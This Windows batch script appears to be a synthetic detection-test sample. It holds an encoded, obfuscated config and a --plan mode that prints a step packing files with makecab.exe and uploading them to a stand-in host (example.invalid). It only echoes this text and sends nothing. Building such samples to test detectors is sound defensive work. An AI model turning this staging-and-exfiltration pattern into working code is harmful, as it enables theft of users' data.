@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:base64_literal|rotate_left

rem HUNTRESS-MATERIAL:7Hpi+OboyuDmetjexsLoyr7Y3sbC2Fjg5MrgwuTKvujkwtzmzMrkWOrg2N7CyL7kytre6Mr4wsjC4OjK5HrawtbKxsLEXMrwyvjm6MLOyr7G3urc6Hpi+M7kwuDQeszC3L7e6uj43Mrw6L7YwtzO6sLOynrc3tzK+MbC2uDC0s7cvtLIesbC2uDC0s7cWnJoxMzCaGZixmD45t7q5MbKvuDC6NB6hnS4qubK5Oa4oOrE2NLGuJDq3OjkyubmmMLEuMbe2NjKxuhacmjEzMJoZmLGYFzGwsT46uDY3sLIvurk2HrQ6Ojg5nReXnJoxMzCaGZixmBcyvDC2uDYylzS3OzC2NLIXurg2N7CyA==

rem HUNTRESS-EXTENSION:bat

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set "h0=v=1|steps=locate_local,prepare_transfer,upload_remote|adapter=makec"
set "h1=ab.exe|stage_count=1|graph=fan_out|next_language=none|campaign_id=c"
set "h2=ampaign-94bfa431c0|source_path=C:\Users\Public\HuntressLab\collect-"
set "h3=94bfa431c0.cab|upload_url=https://94bfa431c0.example.invalid/upload"

goto :HUNTRESS_SEPARATOR_DONE
echo HUNTRESS_SEPARATOR | findstr HUNTRESS >nul
:HUNTRESS_SEPARATOR_DONE

set "neutral_arithmetic=ff689d9f"

for /l %%Q in (1,1,1) do call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
set "cfg=%h0%%h1%%h2%%h3%"
exit /b 0
:HUNTRESS_EMIT

echo(!cfg!

exit /b 0

:HUNTRESS_PLAN

echo makecab.exe upload C:\Users\Public\HuntressLab\collect-94bfa431c0.cab to https://94bfa431c0.example.invalid/upload

exit /b 0

